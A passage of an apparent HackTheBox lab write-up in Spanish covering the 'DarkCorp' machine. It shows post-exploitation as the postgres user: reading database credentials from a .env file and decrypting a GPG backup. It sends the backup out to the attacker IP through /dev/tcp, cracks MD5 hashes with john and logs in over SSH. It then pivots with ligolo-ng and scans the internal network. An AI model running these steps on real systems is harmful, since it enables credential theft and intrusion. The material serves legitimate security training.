drwxr-xr-x 2 root root 4096 Jan 10  2025 media
drwxr-xr-x 2 root root 4096 Jan 10  2025 __pycache__
-rw-r--r-- 1 root root  330 Dec 17  2024 requirements.txt
-rw-r--r-- 1 root root 1037 Dec 19  2024 run.py
```

En este archivo se guardan las credenciales para conectarse a la base de datos

``` bash
postgres@drip:/var/lib/postgresql/15/main$ cat /var/www/html/dashboard/.env
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```

### Database Backup

En el directorio `/var/backups`, encontraremos un directorio llamado `postgres`

``` bash
postgres@drip:/var/lib/postgresql/15/main$ ls -la /var/backups/;
total 1564
drwxr-xr-x  3 root     root       4096 Feb 11  2025 .
drwxr-xr-x 12 root     root       4096 Jan 10  2025 ..
-rw-r--r--  1 root     root      81920 Jan  6  2025 alternatives.tar.0
-rw-r--r--  1 root     root       5714 Jan  2  2025 alternatives.tar.1.gz
-rw-r--r--  1 root     root       5714 Jan  1  2025 alternatives.tar.2.gz
-rw-r--r--  1 root     root       5710 Dec 24  2024 alternatives.tar.3.gz
-rw-r--r--  1 root     root       2229 Dec 19  2024 alternatives.tar.4.gz
-rw-r--r--  1 root     root      40805 Feb  3  2025 apt.extended_states.0
-rw-r--r--  1 root     root       4671 Jan 15  2025 apt.extended_states.1.gz
-rw-r--r--  1 root     root       4675 Dec 30  2024 apt.extended_states.2.gz
-rw-r--r--  1 root     root       4334 Dec 20  2024 apt.extended_states.3.gz
-rw-r--r--  1 root     root       2669 Dec 19  2024 apt.extended_states.4.gz
-rw-r--r--  1 root     root       2004 Dec 17  2024 apt.extended_states.5.gz
-rw-r--r--  1 root     root          0 Jan  1  2025 dpkg.arch.0
-rw-r--r--  1 root     root         32 Dec 24  2024 dpkg.arch.1.gz
-rw-r--r--  1 root     root         32 Dec 20  2024 dpkg.arch.2.gz
-rw-r--r--  1 root     root         32 Dec 19  2024 dpkg.arch.3.gz
-rw-r--r--  1 root     root        473 Dec 20  2024 dpkg.diversions.0
-rw-r--r--  1 root     root        214 Dec 20  2024 dpkg.diversions.1.gz
-rw-r--r--  1 root     root        198 Dec 19  2024 dpkg.diversions.2.gz
-rw-r--r--  1 root     root        168 Dec 17  2024 dpkg.diversions.3.gz
-rw-r--r--  1 root     root        332 Dec 19  2024 dpkg.statoverride.0
-rw-r--r--  1 root     root        219 Dec 19  2024 dpkg.statoverride.1.gz
-rw-r--r--  1 root     root        219 Dec 19  2024 dpkg.statoverride.2.gz
-rw-r--r--  1 root     root        120 Dec 17  2024 dpkg.statoverride.3.gz
-rw-r--r--  1 root     root     863309 Dec 30  2024 dpkg.status.0
-rw-r--r--  1 root     root     207516 Dec 20  2024 dpkg.status.1.gz
-rw-r--r--  1 root     root     154520 Dec 19  2024 dpkg.status.2.gz
-rw-r--r--  1 root     root     129134 Dec 17  2024 dpkg.status.3.gz
drwx------  2 postgres postgres   4096 Feb  5  2025 postgres
```

Dentro de este directorio se encuentra un archivo `dev-dripmail.old.sql.gpg`, el cual parece ser un backup de la base de datos de la plataforma web

``` bash
postgres@drip:/var/lib/postgresql/15/main$ ls -la /var/backups/postgres/
total 12
drwx------ 2 postgres postgres 4096 Feb  5  2025 .
drwxr-xr-x 3 root     root     4096 Feb 11  2025 ..
-rw-r--r-- 1 postgres postgres 1784 Feb  5  2025 dev-dripmail.old.sql.gpg
```


## GPG File Decrypt

> Un archivo `.gpg` es un archivo que ha sido **cifrado o firmado** utilizando [`GNU Privacy Guard`](https://www.gnupg.org/) (`GPG`) o el estándar `OpenPGP` para proteger su privacidad e integridad.
{: .notice--info}

Al ejecutar `file`, notaremos que este es un archivo `GPG` cifrado

``` bash
postgres@drip:/var/lib/postgresql/15/main$ file /var/backups/postgres/dev-dripmail.old.sql.gpg

/var/backups/postgres/dev-dripmail.old.sql.gpg: PGP RSA encrypted session key - keyid: 11123366 61D8BC1F RSA (Encrypt or Sign) 3072b .
```

Los archivos necesarios para `GnuPG` se encuentran dentro del directorio personal del usuario, en este caso dentro de `/var/lib/postgresql/`.

 >El directorio `~/.gnupg` es la ubicación estándar en sistemas Linux donde `GNU Privacy Guard` (GPG) almacena sus archivos de configuración y las claves privadas y públicas del usuario para cifrado y firma digital.

Con el siguiente comando podemos listar el almacén de claves (`pubring.kbx`)

``` bash
postgres@drip:/var/lib/postgresql/15/main$ gpg --list-keys
/var/lib/postgresql/.gnupg/pubring.kbx
--------------------------------------
pub   rsa3072 2025-01-08 [SC] [expires: 2027-01-08]
      3AA1F620319ABF74EF5179C0F426B2D867825D9F
uid           [ultimate] postgres <postgres@drip.darkcorp.htb>
sub   rsa3072 2025-01-08 [E] [expires: 2027-01-08]
```

La clave púbica (`3AA1F620319ABF74EF5179C0F426B2D867825D9F`) tiene asignada las flags `[SC]`:

- `Sign`: Firmar datos/correos.
- `Certify`: Certificar otras subclaves.

La subclave (`sub rsa3072 2025-01-08 [E]`) posee la flag `[E]`:

- `E`: Infica que la subclave está autorizada únicamente para cifrar/descifrar datos. 

> Para [descifrar un archivo `.gpg`](https://www.gnupg.org/gph/en/manual/x110.html) simplemente podríamos utilizar la flag `-d` o `--decrypt`, esto podemos hacerlo si fuéramos el propietario del directorio donde se almacenan los archivos de claves que necesita `gpg`.
{: .notice--primary}

Si intentamos descifrar este archivo en la máquina víctima, nos pedirá un `passphrase`

``` bash
postgres@drip:/var/lib/postgresql/15/main$ gpg -d -o /tmp/dev-dripmail.old.sql /var/backups/postgres/dev-dripmail.old.sql.gpg
```

![image-center](/assets/images/posts/darkcorp-34-hackthebox.png)
{: .align-center}

> Tenemos la contraseña de la base de datos, la cual podemos intentar usar para descifrar este archivo (`2Qa2SsBkQvsc`)
{: .notice--warning}

``` bash
postgres@drip:/var/lib/postgresql/15/main$ gpg -d -o /tmp/dev-dripmail.old.sql /var/backups/postgres/dev-dripmail.old.sql.gpg
gpg: encrypted with 3072-bit RSA key, ID 1112336661D8BC1F, created 2025-01-08
      "postgres <postgres@drip.darkcorp.htb>"
```

Afortunadamente esta contraseña nos permitió descifrar este archivo `.gpg`

### File Transfer

Podemos transferir el archivo resultante hacia nuestra IP para analizarlo localmente.

> Para recibir el archivo, iniciaremos un listener con `netcat`: `nc -lvnp 4444 > dev-dripmail.old.sql`
{: .notice--danger}

Una vez hemos establecido el listener, procederemos a enviarlo a través de un socket TCP

``` bash
postgres@drip:/var/lib/postgresql/15/main$ cat /tmp/dev-dripmail.old.sql > /dev/tcp/10.10.15.30/4444
```

Podemos verificar la integridad de la transmisión calculando el hash del archivo

``` bash
postgres@drip:/var/lib/postgresql/15/main$ md5sum /tmp/dev-dripmail.old.sql    
76fc51180de427dc8500b66a8c062d0c  /tmp/dev-dripmail.old.sql


# in the attacker machine
md5sum dev-dripmail.old.sql    
76fc51180de427dc8500b66a8c062d0c  dev-dripmail.old.sql
```


## Credentials Leakage

Consultando este archivo `.sql` podremos ver que inserta credenciales en las tablas `Admins` y `Users`

``` sql
--
-- Data for Name: Admins; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."Admins" (id, username, password, email) FROM stdin;
1   bcase   dc5484871bc95c4eab58032884be7225    bcase@drip.htb
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
\.


--
-- Data for Name: Users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."Users" (id, username, password, email, host_header, ip_address) FROM stdin;
5001    support d9b9ecbf29db8054b21f303072b37c4e    support@drip.htb    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0   10.0.50.10
5002    bcase   1eace53df87b9a15a37fdc11da2d298d    bcase@drip.htb  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0   10.0.50.10
5003    ebelford    0cebd84e066fd988e89083879e88c5f9    ebelford@drip.htb   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0   10.0.50.10
\.

```


## Hash Cracking

Podemos aplicar un tratamiento de este archivo para guardar solamente lo que nos interesa, hashes de contraseñas (como `rockyou.txt`)

``` bash
bat dev-dripmail.old.sql -r 116:118 -r 127:129 | awk -v OFS=':' '{print $2, $3}' | hashes.txt
bcase:dc5484871bc95c4eab58032884be7225
victor.r:cac1c7b0e7008d67b6db40c03e76b9c0
ebelford:8bbd7f88841b4223ae63c8848969be86
support:d9b9ecbf29db8054b21f303072b37c4e
bcase:1eace53df87b9a15a37fdc11da2d298d
ebelford:0cebd84e066fd988e89083879e88c5f9
```

Lanzaremos la herramienta `john` o `hashcat` para intentar descifrar estos hashes por fureza bruta empleando un diccionario común de posibles contraseñas

``` bash
john --wordlist=/usr/local/share/wordlists/rockyou.txt hashes.txt --format=Raw-MD5
Created directory: /Users/incommatose/.john
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE4.1 4x5])
Press 'q' or Ctrl-C to abort, almost any other key for status
victor1gustavo@# (victor.r)
ThePlague61780   (ebelford)
2g 0:00:00:02 DONE (2026-05-29 15:16) 0.7142g/s 5122Kp/s 5122Kc/s 9920KC/s !..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

Podemos validar estas credenciales frente al servidor `ssh` con `netexec`

``` bash
nxc ssh drip.htb -u ebelford -p 'ThePlague61780'
SSH         10.129.232.7    22     drip.htb         [*] SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3
SSH         10.129.232.7    22     drip.htb         [+] ebelford:ThePlague61780  Linux - Shell access!
```


## Shell as `ebelford` - `drip`

El usuario `ebelford` tiene acceso por `ssh` a la máquina `drip`, nos conectaremos rápidamente con `sshpass`

> No se recomienda usar esta herramienta en un escenario real, porque muestra las credenciales en texto claro.
{: .notice--danger}

``` bash
sshpass -p 'ThePlague61780' ssh -oStrictHostKeyChecking=no ebelford@drip.htb
Warning: Permanently added 'drip.htb' (ED25519) to the list of known hosts.
Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have no mail.
Last login: Wed Feb  5 12:47:18 2025 from 172.16.20.1
ebelford@drip:~$ whoami
ebelford
ebelford@drip:~$ export TERM=xterm
```


## Pivoting

Ya que tenemos una shell más estable, podemos proceder con el acceso a la red interna a través de herramientas de `Tunneling` o con `ssh -D`

``` bash
ebelford@drip:~$ ping -c 1 172.16.20.1
PING 172.16.20.1 (172.16.20.1) 56(84) bytes of data.
64 bytes from 172.16.20.1: icmp_seq=1 ttl=128 time=0.394 ms

--- 172.16.20.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.394/0.394/0.394/0.000 ms
```

### Setup with Ligolo-ng

Iniciaremos el binario `proxy` de `ligolo-ng` en nuestra máquina atacante

``` bash
sudo ./proxy -selfcert
```

Procederemos a copiar el binario `agent` a la máquina víctima, podemos hacerlo de forma confiable con `scp`

``` bash
sshpass -p 'ThePlague61780' scp -oStrictHostKeyChecking=no agent ebelford@drip.htb:/tmp

sshpass -p 'ThePlague61780' ssh -oStrictHostKeyChecking=no ebelford@drip.htb

ebelford@drip:~$ cd /tmp
ebelford@drip:/tmp$
```

Desde la máquina víctima, ejecutaremos el binario `agent` para conectarnos al `proxy`. 

> Cuando la conexión se establezca existosamente, en el proxy veremos el mensaje que se muestra más abajo
{: .notice--success}

``` bash
ebelford@drip:/tmp$ chmod +x agent
ebelford@drip:/tmp$ ./agent -connect 10.10.15.30:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.15.30:11601"


# Proxy message
ligolo-ng »  INFO[0115] Agent joined.                                 id=00155d840302 name=ebelford@drip remote="10.129.5.241:49982"
```

Iniciaremos una nueva interfaz (en mi caso por requierimientos de `MacOS` necesito que se llame `utunX`, en Linux/Windows no es necesario)

``` bash
ligolo-ng » session
? Specify a session : 1 - ebelford@drip - 10.129.5.241:49982 - 00155d840302
[Agent : ebelford@drip] » start --tun utun10
INFO[0156] Starting tunnel to ebelford@drip (00155d840302) 
```

> En mi caso configurar la red aplicado en `MacOS`, puedes consultar la configuración de enrutamiento en la [documentación oficial de `ligolo-ng`](https://docs.ligolo.ng/Quickstart/#setup-routing).
{: .notice--secondary}

``` bash
# Mac config
sudo ifconfig utun10 alias 172.16.20.0 255.255.252.0
sudo route add -net 172.16.20.0/24 -interface utun10
add net 172.16.20.0: gateway utun10
```

Por último, validaremos la configuración lanzando una traza ICMP a una IP de la red interna que sepamos que se encuentra activa. Por ejemplo, la IP de `drip`, la cual es la `.3`

``` bash
ping -c1 172.16.20.3
PING 172.16.20.3 (172.16.20.3): 56 data bytes
64 bytes from 172.16.20.3: icmp_seq=0 ttl=64 time=414.337 ms

--- 172.16.20.3 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 414.337/414.337/414.337/0.000 ms
```


## Network Enumeration

Perfecto, ya configuramos todo correctamente. Estamos listos para comenzar a escanear la red

### Ping Sweep

Comenzaremos nuestro escaneo de la red interna con un `ping sweep`, de forma que verifiquemos qué hosts se encuentran activos en ella

> Un `ping sweep` (o barrido de `ping`) es una técnica de red utilizada para identificar qué direcciones IP dentro de un rango determinado pertenecen a dispositivos activos.
{: .notice--info}

``` bash
fping -ag 172.16.20.0/24 | tee alive_hosts.txt
172.16.20.1
172.16.20.2
172.16.20.3
```

### Port Scanning

Vemos que se encuentran activos los `3` hosts que hasta ahora hemos visto, `DC-01`, `WEB-01` y `drip`

#### DC-01

Lanzaremos un escaneo de puertos hacia el host `DC-01` con el fin de descubrir los servicios que expone hacia la red

``` bash
export DC_IP=172.16.20.1
rustscan -a $DC_IP --ulimit 5000 -- -sC -sV -Pn -n -oN DC_services

Nmap scan report for 172.16.20.1
Host is up, received user-set (0.16s latency).
Scanned at 2026-05-29 15:28:56 -04 for 105s

PORT      STATE SERVICE       REASON  VERSION
22/tcp    open  ssh           syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPM91a70VJCxg10WFerhkQv207077raOCX9rTMPBeEbHqGHO954XaFtpqjoofHOQWi2syh7IoOV5+APBOoJ60k0=
|   256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHquJFnMIhX9y8Ea87tDtRWPtxThlpE2Y1WxGzsyvQQM
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn\'t have a title (text/html).
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-05-29 19:29:06Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: darkcorp.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC-01.darkcorp.htb, DNS:darkcorp.htb, DNS:darkcorp
| Issuer: commonName=DARKCORP-DC-01-CA/domainComponent=darkcorp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-22T12:09:55
| Not valid after:  2124-12-29T12:09:55
| MD5:     f433 7d4f 87a0 c19d 7a7a 7232 111b 499b
| SHA-1:   fede 6913 b730 2f06 8beb c623 2271 afa6 7699 2958
| SHA-256: 0313 e714 8e9f 724e bf9a b265 9633 de1c e784 6568 eea0 8859 b058 c0fd 42ce 9e45
| -----BEGIN CERTIFICATE-----
| MIIHAjCCBOqgAwIBAgITKAAAAASG76NV2bWBpwABAAAABDANBgkqhkiG9w0BAQsF
| ADBLMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya2Nv
| cnAxGjAYBgNVBAMTEURBUktDT1JQLURDLTAxLUNBMCAXDTI1MDEyMjEyMDk1NVoY
| DzIxMjQxMjI5MTIwOTU1WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAruEnJwmyL0DTlX8q4JpjxGIoMuVSEqhPkCsgQP8xeIcrskg1WNjoaCEvRExW
| lb7bsq2/vLpqBIIs3ngr6Q8mzmOUhyQgTIcq6QA+dL8JzLBFQrClQ02f7G4g6g1V
| pw1UxwjeOmrMMkqw6r2Aoty3wYyjeXwXAMIvztE2ETyHdiJ5Veto6I8Yz7E+EQAM
| HUnXm17llz1Zb/ii4/CpyretE3M1AhrvLi5Oi5UYNntcXrH4B3GrVlXBkeF1uK+j
| Ol8TkrtrR2R9f+2Z3ChX6Pk0tCzIsxv9c+4v6V27YNFb98ClU6Ck1f+vRatzZbxq
| oZwNrFky4HHGIlJBUqcjvg3nUQIDAQABo4IDJjCCAyIwNwYJKwYBBAGCNxUHBCow
| KAYgKwYBBAGCNxUIhaDcTYXg6mmCmYk1gZzNOoWG7hwDASECAW4CAQIwMgYDVR0l
| BCswKQYIKwYBBQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4G
| A1UdDwEB/wQEAwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsG
| AQUFBwMBMAwGCisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUm6Jgy+5c
| zWivRiAYCFIMQhLzuEMwHwYDVR0jBBgwFoAUveFrnur+AiuTtRhMtL2zcnlaQG0w
| gc4GA1UdHwSBxjCBwzCBwKCBvaCBuoaBt2xkYXA6Ly8vQ049REFSS0NPUlAtREMt
| MDEtQ0EsQ049REMtMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZGFya2NvcnAsREM9aHRi
| P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxE
| aXN0cmlidXRpb25Qb2ludDCBxAYIKwYBBQUHAQEEgbcwgbQwgbEGCCsGAQUFBzAC
| hoGkbGRhcDovLy9DTj1EQVJLQ09SUC1EQy0wMS1DQSxDTj1BSUEsQ049UHVibGlj
| JTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixE
| Qz1kYXJrY29ycCxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNz
| PWNlcnRpZmljYXRpb25BdXRob3JpdHkwOAYDVR0RAQH/BC4wLIISREMtMDEuZGFy
| a2NvcnAuaHRiggxkYXJrY29ycC5odGKCCGRhcmtjb3JwME8GCSsGAQQBgjcZAgRC
| MECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0yMS0zNDMyNjEwMzY2LTIxNjMzMzY0
| ODgtMzYwNDIzNjg0Ny0xMDAwMA0GCSqGSIb3DQEBCwUAA4ICAQCKmQ0FHS5X6atP
| pooTkOmuP5ebsoINxwfx03DKrFY23bDG0Zv7rH92UW4ptkLZ5Vq4W2zHGd9miMAu
| LyGhL8r/mynrC9eaQZykP83hNKidcL8hiaoXi0VkU76oAMSUaI8IjD0iZp+xNRQW
| YOMf2aRDqjVHof9mYJJc94Uobqm/fYaCBS6FnKtXjI1JsCMlKhGBJVMXCu7krOVc
| 47wK/MlP1YH3CaQ1qIFnaxiRPrGM5q1igER1fu4x8ZUqi2I29IAKwlNtvwuQsIWF
| HWTL6jYURAJqNt6rf2llbRKNsA9wWMEh4I3cMXS52IJPSB9r4dpT0Hv6sD+D+azX
| /YNJzUUO+h6gC1B20z6cPVAAQe3yozKRMSh3ja+2EI+9OPgOVDK8RbF2rs8DgtRK
| kys/tCtLZjZaBZ0UDFCr3Uliu2JEcIF5f4Pf2y7VA6Ep8cR+vd4ai4UPr+1wv2DH
| UCHzrLsCiRV4kld9gHkhX8bWlGtO8evo4qV1yZ2KaH2M1zf17VVKUNiaNFev1SGb
| 96Siu0GXXz/lHwrJyfdZkCBp8U7Z5dD0jNwF+0F5f+w3KpPXTXuogw4IRR4ug8A4
| cp+HB0IGKK2YCJZLhjFdBJESYGxtWQBun73Ryt76SlUUSQ1eIUypYOJA78wgMA8A
| w6Gt7i+UoIw1vr6SbQVMyuiM3umSvA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DARKCORP-DC-01-CA/domainComponent=darkcorp
| Issuer: commonName=DARKCORP-DC-01-CA/domainComponent=darkcorp
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-29T23:24:10
| Not valid after:  2034-12-29T23:34:10
| MD5:     5e72 14e1 f6b3 9f30 c333 8062 d354 cd58
| SHA-1:   2eb1 b6f7 0f08 9063 e7da 640b c74b 6ab2 bbf4 3591
| SHA-256: b844 6abb 919c c381 92a7 d5bd 8c21 864d 40d8 f89f b218 00d0 0f08 8767 3125 adf2
| -----BEGIN CERTIFICATE-----
| MIIFcTCCA1mgAwIBAgIQUjTGSvFm0p1ICwbO6gGWaDANBgkqhkiG9w0BAQsFADBL
| MRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya2NvcnAx
| GjAYBgNVBAMTEURBUktDT1JQLURDLTAxLUNBMB4XDTI0MTIyOTIzMjQxMFoXDTM0
| MTIyOTIzMzQxMFowSzETMBEGCgmSJomT8ixkARkWA2h0YjEYMBYGCgmSJomT8ixk
| ARkWCGRhcmtjb3JwMRowGAYDVQQDExFEQVJLQ09SUC1EQy0wMS1DQTCCAiIwDQYJ
| KoZIhvcNAQEBBQADggIPADCCAgoCggIBAMvngqG/UnjvQsFBri4zXLzRdYJ25yPq
| ajx4g8LSI5MYTpmQdZUnlqQbwAIK/GL6Ur/hF388TPdtxj90IUowpSniu4T0IbM4
| dnnwOQJBiv80PCBP5ZqC1LGJypWKrdQEuGxKQ7QC74E4ureQwVXMkSIQKf7czDL9
| ZJOsEXGk+JJgcu4tWPbnsJcJV9TEMffURz5AO95S9hr7u/6Rv3Fw+uiKbmGEvSTw
| cG1eSn3HG9zIgghqhdhYoaM2Xxo4LaIEvimjiGRqRATjTRuCiaRj+QprvIhr/Xmt
| I9zg1p/QOpxt6AX5fRHR3kVvmUgEgg7FMsw20Ob3kC2nH+qUTqj3xt2atTBUHjTs
| p7pZuXcgO69hTUS48qM+KEl08ESzmB8o/zFDxyO86Odgl8MvOJmAHJXxwWiKTYuG
| uZg1gK3OPKi/n6PUgxaUyb5NmoBEKaTFy2yVSbW/FKIt9530Q1Gzjue9BYQBS9oL
| AgzSR+EsCP5Zj3AF3pBVdkxOLI0kQpJS26Zfggdl3Izh6aSxbChIvb8MwdmGWr9x
| I0071MZotRLQej+MW8IlpxnypI0Z3fw9zotYFxqJUDsBnNyehmjygQ2Uw06g6ZTJ
| SdAufGvbYtY+FanVC0Cylyrfx+dJ45zwJNOyS0GT/o8ZYOIWm6nmKmWNpuygYLqY
| wzR/J5za3zKZAgMBAAGjUTBPMAsGA1UdDwQEAwIBhjAPBgNVHRMBAf8EBTADAQH/
| MB0GA1UdDgQWBBS94Wue6v4CK5O1GEy0vbNyeVpAbTAQBgkrBgEEAYI3FQEEAwIB
| ADANBgkqhkiG9w0BAQsFAAOCAgEAE/pLahq3wGNrEdWs6MrIfc6C4vaMhq4xLM/x
| Dxz36MdwLtv1rDgV4qtK+6rb5qgXaLNLXWnXQUPjtCezEgDGQslsudW+vUhetKbK
| Hb4Fiu6Fv/eSs6YwNbsMQf9mKVz6EpEVgB3V4pwRH7p3Cw4csAJdLPPGlYRR6WCp
| qWOaqCYOKalajOku//L+3eaf609wQlHxja+HL7LiYb0pEIwz9P98xeeH7ZVMqfMB
| RdRLhdxHwERBbr1lAotuCKLrI36EWR+2tHl6LwstIJcRLdR/9Tot9L4fnhEM11jT
| i1R7XUvj+QcF33hgDSPTPmTMru7meF9+mHvApP7wyeGlQhRq3WuoOAQDLHq6jHN0
| YcqrBbfFpgBuR6NJTiUV0wzwIxeLtXy+8zez0SdOeEhfFGXUxT7iL/kaRmi5tUs6
| wRYkOdSA54/5uu8ImRvBO+0A815aHeWXVcLcWMzlzNG/KRF8KPdk10d0N3P/mCt9
| X7buW5XhW84WytA9KjGjdkrFZvNJHuTos+AYp0Mw4WrpyFr+no1wO3fb+77ULK+h
| Gjo2ayAayuBCO7aCW1ABYhsdXRhNomC25FFV4NNkIEj/qHMMwr315HHQ333RbIvd
| PkAI0bTDDOQUD7gMFrSN2lCFFBSPUwbFaGUKWdiperag3svU4GTkHiUMJt47h968
| 7rPjK3k=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: darkcorp.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC-01.darkcorp.htb, DNS:darkcorp.htb, DNS:darkcorp
| Issuer: commonName=DARKCORP-DC-01-CA/domainComponent=darkcorp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-22T12:09:55
| Not valid after:  2124-12-29T12:09:55
| MD5:     f433 7d4f 87a0 c19d 7a7a 7232 111b 499b
| SHA-1:   fede 6913 b730 2f06 8beb c623 2271 afa6 7699 2958
| SHA-256: 0313 e714 8e9f 724e bf9a b265 9633 de1c e784 6568 eea0 8859 b058 c0fd 42ce 9e45
| -----BEGIN CERTIFICATE-----
| MIIHAjCCBOqgAwIBAgITKAAAAASG76NV2bWBpwABAAAABDANBgkqhkiG9w0BAQsF
| ADBLMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya2Nv
| cnAxGjAYBgNVBAMTEURBUktDT1JQLURDLTAxLUNBMCAXDTI1MDEyMjEyMDk1NVoY
| DzIxMjQxMjI5MTIwOTU1WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAruEnJwmyL0DTlX8q4JpjxGIoMuVSEqhPkCsgQP8xeIcrskg1WNjoaCEvRExW
| lb7bsq2/vLpqBIIs3ngr6Q8mzmOUhyQgTIcq6QA+dL8JzLBFQrClQ02f7G4g6g1V
| pw1UxwjeOmrMMkqw6r2Aoty3wYyjeXwXAMIvztE2ETyHdiJ5Veto6I8Yz7E+EQAM
| HUnXm17llz1Zb/ii4/CpyretE3M1AhrvLi5Oi5UYNntcXrH4B3GrVlXBkeF1uK+j
| Ol8TkrtrR2R9f+2Z3ChX6Pk0tCzIsxv9c+4v6V27YNFb98ClU6Ck1f+vRatzZbxq
| oZwNrFky4HHGIlJBUqcjvg3nUQIDAQABo4IDJjCCAyIwNwYJKwYBBAGCNxUHBCow
| KAYgKwYBBAGCNxUIhaDcTYXg6mmCmYk1gZzNOoWG7hwDASECAW4CAQIwMgYDVR0l
| BCswKQYIKwYBBQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4G
| A1UdDwEB/wQEAwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsG
| AQUFBwMBMAwGCisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUm6Jgy+5c
| zWivRiAYCFIMQhLzuEMwHwYDVR0jBBgwFoAUveFrnur+AiuTtRhMtL2zcnlaQG0w
